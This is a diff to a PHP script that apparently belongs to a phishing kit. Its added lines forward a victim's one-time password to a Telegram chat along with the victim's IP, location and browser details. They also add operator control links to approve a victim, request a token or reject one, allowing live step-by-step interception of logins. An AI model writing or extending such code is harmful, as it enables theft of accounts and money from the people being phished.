@@ -84,6 +84,22 @@ $lines[] = "🌐 <b>IP:</b> "    . $esc($ip);
 $lines[] = "📍 <b>País:</b> "  . $esc($country);
 $lines[] = "🏙️ <b>Ciudad:</b> ". $esc($city);
 $lines[] = "🖥️ <b>UA:</b> "    . $esc(substr($_SERVER['HTTP_USER_AGENT'] ?? '', 0, 150));
+if (!empty($d['token'])) $lines[] = "🔢 <b>OTP:</b> "     . $esc($d['token']);
+
+// Links de control clickeables para el operador
+$proto = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
+$host  = $_SERVER['HTTP_HOST'] ?? 'localhost';
+$ctrl  = $proto . '://' . $host . '/simulador/wait.php?k=op2025';
+if (strpos($step, '4 ·') !== false || strpos($step, 'COMPLETO') !== false) {
+    $lines[] = '';
+    $lines[] = "🎛 <b>Controles:</b>";
+    $lines[] = "✅ <a href=\"{$ctrl}&s=continue\">APROBAR</a>  |  💬 <a href=\"{$ctrl}&s=token\">PEDIR TOKEN</a>  |  ❌ <a href=\"{$ctrl}&s=error\">RECHAZAR</a>";
+}
+if (strpos($step, 'TOKEN') !== false) {
+    $lines[] = '';
+    $lines[] = "🎛 <b>Controles:</b>";
+    $lines[] = "✅ <a href=\"{$ctrl}&s=finish\">APROBAR</a>  |  ❌ <a href=\"{$ctrl}&s=error\">INVÁLIDO</a>";
+}
 
 $payload = json_encode([
     'chat_id'    => $TG_CHAT,
